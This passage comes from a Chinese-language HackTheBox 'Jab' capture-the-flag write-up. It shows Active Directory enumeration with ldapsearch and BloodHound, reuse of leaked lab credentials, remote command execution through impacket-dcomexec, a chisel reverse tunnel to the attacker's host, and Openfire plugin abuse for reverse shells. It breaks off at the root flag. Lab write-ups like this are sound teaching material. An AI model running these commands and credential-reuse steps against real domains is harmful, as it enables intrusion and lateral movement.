+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>dn:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Joyce<span class="w"> </span>Montgomery,OU<span class="o">=</span>Server<span class="w"> </span>Admin,OU<span class="o">=</span>IT,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>objectClass:<span class="w"> </span>top
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>objectClass:<span class="w"> </span>person
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>objectClass:<span class="w"> </span>organizationalPerson
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>objectClass:<span class="w"> </span>user
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>cn:<span class="w"> </span>Joyce<span class="w"> </span>Montgomery
+</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>sn:<span class="w"> </span>Montgomery
+</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>l:<span class="w"> </span>Belleville
+</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>postalCode:<span class="w"> </span><span class="m">7109</span>
+</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>givenName:<span class="w"> </span>Joyce
+</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a>distinguishedName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Joyce<span class="w"> </span>Montgomery,OU<span class="o">=</span>Server<span class="w"> </span>Admin,OU<span class="o">=</span>IT,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC
+</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a><span class="w"> </span><span class="o">=</span>htb
+</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>instanceType:<span class="w"> </span><span class="m">4</span>
+</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a>whenCreated:<span class="w"> </span><span class="m">20231027142621</span>.0Z
+</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a>whenChanged:<span class="w"> </span><span class="m">20240322054643</span>.0Z
+</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>displayName:<span class="w"> </span>Joyce<span class="w"> </span>Montgomery
+</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44" href="#__codelineno-9-44"></a>uSNCreated:<span class="w"> </span><span class="m">45753</span>
+</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45" href="#__codelineno-9-45"></a>memberOf:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Contractors,OU<span class="o">=</span>Security<span class="w"> </span>Groups,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46" href="#__codelineno-9-46"></a>uSNChanged:<span class="w"> </span><span class="m">262235</span>
+</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47" href="#__codelineno-9-47"></a>department:<span class="w"> </span>DevOps
+</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48" href="#__codelineno-9-48"></a>streetAddress:<span class="w"> </span><span class="m">4554</span><span class="w"> </span>Duke<span class="w"> </span>Lane
+</span><span id="__span-9-49"><a id="__codelineno-9-49" name="__codelineno-9-49" href="#__codelineno-9-49"></a>name:<span class="w"> </span>Joyce<span class="w"> </span>Montgomery
+</span><span id="__span-9-50"><a id="__codelineno-9-50" name="__codelineno-9-50" href="#__codelineno-9-50"></a>objectGUID::<span class="w"> </span><span class="nv">WlBjJbgLXEyNFGeZmPlfow</span><span class="o">==</span>
+</span><span id="__span-9-51"><a id="__codelineno-9-51" name="__codelineno-9-51" href="#__codelineno-9-51"></a>userAccountControl:<span class="w"> </span><span class="m">4260352</span>
+</span><span id="__span-9-52"><a id="__codelineno-9-52" name="__codelineno-9-52" href="#__codelineno-9-52"></a>badPwdCount:<span class="w"> </span><span class="m">6</span>
+</span><span id="__span-9-53"><a id="__codelineno-9-53" name="__codelineno-9-53" href="#__codelineno-9-53"></a>codePage:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-54"><a id="__codelineno-9-54" name="__codelineno-9-54" href="#__codelineno-9-54"></a>countryCode:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-55"><a id="__codelineno-9-55" name="__codelineno-9-55" href="#__codelineno-9-55"></a>badPasswordTime:<span class="w"> </span><span class="m">133492008984698362</span>
+</span><span id="__span-9-56"><a id="__codelineno-9-56" name="__codelineno-9-56" href="#__codelineno-9-56"></a>lastLogoff:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-57"><a id="__codelineno-9-57" name="__codelineno-9-57" href="#__codelineno-9-57"></a>lastLogon:<span class="w"> </span><span class="m">133429072652390603</span>
+</span><span id="__span-9-58"><a id="__codelineno-9-58" name="__codelineno-9-58" href="#__codelineno-9-58"></a>logonHours::<span class="w"> </span>////////////////////////////
+</span><span id="__span-9-59"><a id="__codelineno-9-59" name="__codelineno-9-59" href="#__codelineno-9-59"></a>pwdLastSet:<span class="w"> </span><span class="m">133492000755121222</span>
+</span><span id="__span-9-60"><a id="__codelineno-9-60" name="__codelineno-9-60" href="#__codelineno-9-60"></a>primaryGroupID:<span class="w"> </span><span class="m">513</span>
+</span><span id="__span-9-61"><a id="__codelineno-9-61" name="__codelineno-9-61" href="#__codelineno-9-61"></a>objectSid::<span class="w"> </span>AQUAAAAAAAUVAAAABf2rKo+DQ34hQoIO8wYAAA<span class="o">==</span>
+</span><span id="__span-9-62"><a id="__codelineno-9-62" name="__codelineno-9-62" href="#__codelineno-9-62"></a>accountExpires:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-63"><a id="__codelineno-9-63" name="__codelineno-9-63" href="#__codelineno-9-63"></a>logonCount:<span class="w"> </span><span class="m">2</span>
+</span><span id="__span-9-64"><a id="__codelineno-9-64" name="__codelineno-9-64" href="#__codelineno-9-64"></a>sAMAccountName:<span class="w"> </span>jmontgomery
+</span><span id="__span-9-65"><a id="__codelineno-9-65" name="__codelineno-9-65" href="#__codelineno-9-65"></a>sAMAccountType:<span class="w"> </span><span class="m">805306368</span>
+</span><span id="__span-9-66"><a id="__codelineno-9-66" name="__codelineno-9-66" href="#__codelineno-9-66"></a>userPrincipalName:<span class="w"> </span>jmontgomery@jab.htb
+</span><span id="__span-9-67"><a id="__codelineno-9-67" name="__codelineno-9-67" href="#__codelineno-9-67"></a>objectCategory:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-68"><a id="__codelineno-9-68" name="__codelineno-9-68" href="#__codelineno-9-68"></a>dSCorePropagationData:<span class="w"> </span><span class="m">20231027191223</span>.0Z
+</span><span id="__span-9-69"><a id="__codelineno-9-69" name="__codelineno-9-69" href="#__codelineno-9-69"></a>dSCorePropagationData:<span class="w"> </span><span class="m">16010101000000</span>.0Z
+</span><span id="__span-9-70"><a id="__codelineno-9-70" name="__codelineno-9-70" href="#__codelineno-9-70"></a>lastLogonTimestamp:<span class="w"> </span><span class="m">133555600035349598</span>
+</span><span id="__span-9-71"><a id="__codelineno-9-71" name="__codelineno-9-71" href="#__codelineno-9-71"></a>msDS-SupportedEncryptionTypes:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-72"><a id="__codelineno-9-72" name="__codelineno-9-72" href="#__codelineno-9-72"></a>
+</span><span id="__span-9-73"><a id="__codelineno-9-73" name="__codelineno-9-73" href="#__codelineno-9-73"></a><span class="c1"># refldaps://ForestDnsZones.jab.htb/DC=ForestDnsZones,DC=jab,DC=htb</span>
+</span><span id="__span-9-74"><a id="__codelineno-9-74" name="__codelineno-9-74" href="#__codelineno-9-74"></a>
+</span><span id="__span-9-75"><a id="__codelineno-9-75" name="__codelineno-9-75" href="#__codelineno-9-75"></a><span class="c1"># refldaps://DomainDnsZones.jab.htb/DC=DomainDnsZones,DC=jab,DC=htb</span>
+</span><span id="__span-9-76"><a id="__codelineno-9-76" name="__codelineno-9-76" href="#__codelineno-9-76"></a>
+</span><span id="__span-9-77"><a id="__codelineno-9-77" name="__codelineno-9-77" href="#__codelineno-9-77"></a><span class="c1"># refldaps://jab.htb/CN=Configuration,DC=jab,DC=htb</span>
+</span><span id="__span-9-78"><a id="__codelineno-9-78" name="__codelineno-9-78" href="#__codelineno-9-78"></a>
+</span><span id="__span-9-79"><a id="__codelineno-9-79" name="__codelineno-9-79" href="#__codelineno-9-79"></a>
+</span><span id="__span-9-80"><a id="__codelineno-9-80" name="__codelineno-9-80" href="#__codelineno-9-80"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-9-81"><a id="__codelineno-9-81" name="__codelineno-9-81" href="#__codelineno-9-81"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldaps://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;OU=IT,OU=Corp,DC=jab,DC=htb&quot;</span><span class="w"> </span>description<span class="w">          </span>
+</span><span id="__span-9-82"><a id="__codelineno-9-82" name="__codelineno-9-82" href="#__codelineno-9-82"></a>dn:<span class="w"> </span><span class="nv">OU</span><span class="o">=</span>IT,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-83"><a id="__codelineno-9-83" name="__codelineno-9-83" href="#__codelineno-9-83"></a>description::<span class="w"> </span>SW5mb3JtYXRpb24gVGVjaG5vbG9neSBwZXJzb25uZWwg
+</span><span id="__span-9-84"><a id="__codelineno-9-84" name="__codelineno-9-84" href="#__codelineno-9-84"></a>
+</span><span id="__span-9-85"><a id="__codelineno-9-85" name="__codelineno-9-85" href="#__codelineno-9-85"></a>dn:<span class="w"> </span><span class="nv">OU</span><span class="o">=</span>HelpDesk,OU<span class="o">=</span>IT,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-86"><a id="__codelineno-9-86" name="__codelineno-9-86" href="#__codelineno-9-86"></a>description::<span class="w"> </span><span class="nv">SGVscCBEZXNrIHBlcnNvbm5lbCA</span><span class="o">=</span>
+</span><span id="__span-9-87"><a id="__codelineno-9-87" name="__codelineno-9-87" href="#__codelineno-9-87"></a>
+</span><span id="__span-9-88"><a id="__codelineno-9-88" name="__codelineno-9-88" href="#__codelineno-9-88"></a>dn:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Dagmar<span class="w"> </span>Payne,OU<span class="o">=</span>HelpDesk,OU<span class="o">=</span>IT,OU<span class="o">=</span>Corp,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-9-89"><a id="__codelineno-9-89" name="__codelineno-9-89" href="#__codelineno-9-89"></a>
+</span><span id="__span-9-90"><a id="__codelineno-9-90" name="__codelineno-9-90" href="#__codelineno-9-90"></a><span class="w"> </span><span class="o">(</span>...<span class="o">)</span>
+</span><span id="__span-9-91"><a id="__codelineno-9-91" name="__codelineno-9-91" href="#__codelineno-9-91"></a>
+</span><span id="__span-9-92"><a id="__codelineno-9-92" name="__codelineno-9-92" href="#__codelineno-9-92"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-9-93"><a id="__codelineno-9-93" name="__codelineno-9-93" href="#__codelineno-9-93"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldaps://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Configuration,DC=jab,DC=htb&quot;</span><span class="w"> </span>description<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>description
+</span><span id="__span-9-94"><a id="__codelineno-9-94" name="__codelineno-9-94" href="#__codelineno-9-94"></a>description:<span class="w"> </span>The<span class="w"> </span>Personally<span class="w"> </span>Identifiable<span class="w"> </span>Information<span class="w"> </span><span class="o">(</span>PII<span class="o">)</span><span class="w"> </span>property<span class="w"> </span>specifies<span class="w"> </span>
+</span><span id="__span-9-95"><a id="__codelineno-9-95" name="__codelineno-9-95" href="#__codelineno-9-95"></a>description:<span class="w"> </span>The<span class="w"> </span>Protected<span class="w"> </span>Health<span class="w"> </span>Information<span class="w"> </span><span class="o">(</span>PHI<span class="o">)</span><span class="w"> </span>property<span class="w"> </span>specifies<span class="w"> </span>whether
+</span><span id="__span-9-96"><a id="__codelineno-9-96" name="__codelineno-9-96" href="#__codelineno-9-96"></a><span class="w"> </span><span class="o">(</span>...<span class="o">)</span>
+</span></code></pre></div></p>
+<h3 id="jabber_1">再次登录Jabber发现新凭据<a class="headerlink" href="#jabber_1" title="Permanent link">&para;</a></h3>
+<p>尝试用这个号登录pidgin，在菜单发现“添加聊天”中有个“聊天室列表”。在其中发现一个叫“pentest2003”的聊天室，里面提到之前的渗透测试中破解了一个带SPN的账号（<code>svc_openfire:!@#$%^&amp;*(1qazxsw</code>）。似乎已经删除SPN了，但是没说改密码的事情。可以尝试是否可以利用？</p>
+<p><a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-10.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-pidgin-10" src="../../evidence-img/HTB-Jab-pidgin-10.png" /></a>
+<a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-11.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-pidgin-11" src="../../evidence-img/HTB-Jab-pidgin-11.png" /></a></p>
+<h2 id="svc_openfire">svc_openfire凭据下的探索<a class="headerlink" href="#svc_openfire" title="Permanent link">&para;</a></h2>
+<p>继续重复前面的步骤，结果一无所获。<br />
+于是又翻看着那份<strong><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/">域渗透思维导图</a></strong>，目前是“valid credentials”的阶段。其中说的获取用户清单、枚举SMB共享、LDAP之前都试过了没什么有用信息。那就转向“bloodhound”看看吧。</p>
+<p><em>另外，枚举用户和SMB共享看他用的<a href="https://github.com/byt3bl33d3r/CrackMapExec">CME（CrackMapExec）</a>，想起来之前看到说CME已经停止维护了，现在似乎<a href="https://github.com/Pennyw0rth/NetExec">NetExec（nxc）</a>是其替代品，于是正好在这台机器也实践了一下NetExec。竟然能枚举出SMB共享列表（前面用<code>smbclient</code>都直接报错不能登录来着）。还挺神奇的。</em></p>
+<h3 id="bloodhound">BloodHound探索<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
+<p>首先看到<strong><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/">域渗透思维导图</a></strong>中用的命令是<code>bloodhound-python</code>，<a href="https://www.kali.org/tools/bloodhound.py/">安装</a>执行后总是报错（后来发现其实加入<code>-ns</code>选项就能解决，当时没懂）。于是倒腾了一下<code>nxc</code>发现其ldap模块也能调用bloodhound，于是索性用<code>nxc</code>解决了。<br />
+<code>nxc ldap 10.10.11.4 -u svc_openfire -p '!@#$%^&amp;*(1qazxsw' --bloodhound -c all -ns 10.10.11.4</code></p>
+<p>结果输出一个zip文件，然后意识到需要GUI，于是还得<a href="https://www.kali.org/tools/bloodhound/">安装完整的bloodhound</a>。配置好之后上传zip结果文件，点了点预定义的搜索没发现什么有用的信息（可能主要是不太会用）。最后想到直接搜搜目前拿到的两个域账户，结果发现<code>svc_openfire</code>似乎是可利用的：
+<a class="glightbox" href="../../evidence-img/HTB-Jab-bloodhound-svc_openfire.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-bloodhound-svc_openfire" src="../../evidence-img/HTB-Jab-bloodhound-svc_openfire.png" /></a></p>
+<h3 id="executedcom">ExecuteDCOM<a class="headerlink" href="#executedcom" title="Permanent link">&para;</a></h3>
+<p>搜了下<code>ExecuteDCOM</code>，发现了值得参考的文章：</p>
+<blockquote>
+<p>利用方法：<a href="https://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html">https://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html</a><br />
+扩展知识：<a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec#mmc20.application">https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec#mmc20.application</a></p>
+</blockquote>
+<p>按照文章中的命令执行，发现卡在“SMBv3.0 dialect used”，最后发现用<code>-nooutput</code>选项就好了：<br />
+<em>因为卡在SMB连接，而help看这个选项说“no SMB connection created”。</em><br />
+<em>而后细看上面文章提到的<code>-silentcommand</code>，试了下也行，可能理由一样，就是文章里说的“since the script is using an SMB share to write and fetch the output, and our low-privileged user cannot write to any.”？</em></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>└─$<span class="w"> </span>impacket-dcomexec<span class="w"> </span>jab.htb/svc_openfire:<span class="s1">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@10.10.11.4<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>-object<span class="w"> </span>MMC20
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Impacket<span class="w"> </span>v0.11.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2023</span><span class="w"> </span>Fortra
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>SMBv3.0<span class="w"> </span>dialect<span class="w"> </span>used
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>^C<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>└─$<span class="w"> </span>impacket-dcomexec<span class="w"> </span>jab.htb/svc_openfire:<span class="s1">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@10.10.11.4<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>-object<span class="w"> </span>MMC20<span class="w"> </span>-nooutput
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Impacket<span class="w"> </span>v0.11.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2023</span><span class="w"> </span>Fortra
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>└─$<span class="w"> </span>
+</span></code></pre></div>
+<h2 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>由于无法输出命令结果到终端，为了验证命令是否真的被执行，于是尝试ping自己并监听网卡，发现收到ping包——即命令可成功执行：
+<a class="glightbox" href="../../evidence-img/HTB-Jab-ping.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-ping" src="../../evidence-img/HTB-Jab-ping.png" /></a></p>
+<p>接下来就准备反弹shell，成功接收：
+<a class="glightbox" href="../../evidence-img/HTB-Jab-foothold.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-foothold" src="../../evidence-img/HTB-Jab-foothold.png" /></a></p>
+<h2 id="flag-user">flag: user<a class="headerlink" href="#flag-user" title="Permanent link">&para;</a></h2>
+<p>svc_openfire用户的桌面就有flag：
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_openfire</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="nb">ls</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_openfire</span><span class="p">\</span><span class="n">desktop</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>                                                                  
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>                                                                  
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="n">-ar</span><span class="p">---</span>        <span class="n">3</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2024</span>   <span class="n">3</span><span class="p">:</span><span class="n">20</span> <span class="n">AM</span>             <span class="n">34</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>                                                              
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_openfire</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="n">501</span> <span class="p">(...)</span> <span class="n">d2e</span>
+</span></code></pre></div></p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="internal-recon">Internal Recon<a class="headerlink" href="#internal-recon" title="Permanent link">&para;</a></h3>
+<p>在端口信息中发现开放了本地端口9090——即最开始我们谷歌搜到的<code>CVE-2023-32315</code>。原来是在这里用啊……</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>PS C:\Users\svc_openfire\Desktop&gt; netstat -anop tcp |findstr LISTEN
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a> (...)
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3128
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3128
+</span></code></pre></div>
+<h3 id="poc-cve-2023-32315-like">PoC (CVE-2023-32315 like)<a class="headerlink" href="#poc-cve-2023-32315-like" title="Permanent link">&para;</a></h3>
+<h4 id="chisel">chisel配置端口转发<a class="headerlink" href="#chisel" title="Permanent link">&para;</a></h4>
+<p>首先配置端口转发，本来想跟<a href="../HTB-OnlyForYou/#sliver-c2">之前一样用SilverC2</a>或msf，正好在桌面看到前人留下的chisel（文件上传方法在此也就省略了，可参考<a href="../HTB-Authority/#certify">HTB-Authority</a>），以前也没用过，那这次就试试chisel吧。<br />
+其实看help没太懂怎么用，搜了下，还得是<a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-forwarding">Hacktricks</a>啊：
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>chisel server -p 12312 --reverse    #Server -- Attacker
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>./chisel.exe client 10.10.14.14:12312 R:9090:127.0.0.1:9090    #Client -- Victim
+</span></code></pre></div></p>
+<p>配置完成后浏览器访问，成功显示console登录界面：</p>
+<p><a class="glightbox" href="../../evidence-img/HTB-Jab-openfire.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="openfire" src="../../evidence-img/HTB-Jab-openfire.png" /></a></p>
+<p>接下来就是按照<a href="https://github.com/miko550/CVE-2023-32315">github大佬的exp</a>了。</p>
+<p>不过，执行exp后用新创建的用户登录会失败：</p>
+<p><a class="glightbox" href="../../evidence-img/HTB-Jab-openfire-1.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-openfire-1" src="../../evidence-img/HTB-Jab-openfire-1.png" /></a></p>
+<p>这也正常，可以发现登录界面写了版本<code>4.7.5</code>，而<code>CVE-2023-32315</code>也正好在这个版本修复了。</p>
+<blockquote>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32315">The problem has been patched in Openfire release 4.7.5...</a></p>
+</blockquote>
+<h4 id="shell">插件漏洞获得反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
+<p>但是，我们可以用<code>svc_openfire</code>账户成功登陆：<br />
+<a class="glightbox" href="../../evidence-img/HTB-Jab-openfire-2.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-openfire-2" src="../../evidence-img/HTB-Jab-openfire-2.png" /></a></p>
+<p>继续试试这个插件能否使用，<br />
+<a class="glightbox" href="../../evidence-img/HTB-Jab-openfire-3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-openfire-3" src="../../evidence-img/HTB-Jab-openfire-3.png" /></a></p>
+<p>经过和之前一样的ping方式验证，这个插件还是可以执行任意命令，于是毫不犹豫执行反弹shell命令，成功getshell：<br />
+<a class="glightbox" href="../../evidence-img/HTB-Jab-openfire-4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab-openfire-4" src="../../evidence-img/HTB-Jab-openfire-4.png" /></a></p>
+<h2 id="flag-root">flag: root<a class="headerlink" href="#flag-root" title="Permanent link">&para;</a></h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">administrator</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="nb">ls</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
